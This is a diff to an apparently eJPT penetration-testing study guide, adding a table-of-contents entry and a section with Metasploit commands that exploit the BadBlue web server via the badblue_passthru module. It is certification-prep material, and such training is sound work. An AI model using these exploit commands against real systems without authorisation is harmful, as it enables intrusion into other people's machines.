@@ -28,6 +28,7 @@ Info about eJPT certification [here](https://security.ine.com/certifications/ejp
 - [Exploiting MS17-010](#Exploiting-MS17-010)
 - [RDP Exploitation](#RDP-Exploitation)
 - [Exploit Blue Keep](#Exploit-Blue-Keep)
+- [Explpoit Bad Blue](#Exploit-Bad-Blue)
 - [Exploiting WinRM](#Exploiting-WinRM)
 - [Windows Kernel Exploits](#Windows-Kernel-Exploits)
 - [Bypassing UAC with UACMe](#Bypassing-UAC-with-UACMe)
@@ -1260,7 +1261,16 @@ set target <target-number>
 exploit
 ```
 
-> Module can be used to exploit the vulnerability and then get access. 
+> Module can be used to exploit the vulnerability and then get access.
+
+#### Exploit Bad Blue
+
+```shell
+use exploit/windows/http/badblue_passthru
+set RHOSTS <local-IP>
+set target BadBlue\ EE\ 2.7\ Universal
+run
+```
 
 #### Exploiting WinRM:
 
